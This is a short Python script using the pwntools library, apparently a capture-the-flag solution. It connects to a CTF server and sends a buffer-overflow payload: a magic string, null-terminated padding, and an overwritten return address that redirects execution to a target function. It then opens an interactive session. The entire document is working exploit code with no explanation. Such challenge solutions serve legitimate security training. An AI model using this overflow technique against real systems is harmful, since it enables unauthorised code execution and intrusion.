from pwn import *

context.arch = 'amd64'
p = remote('ctf.adl.tw', 10001)

target_addr = 0x40125b

payload = b"shukishukidaishuki\x00" 

payload += b"A"*21 
payload += p64(target_addr)
p.sendline(payload)
p.interactive()
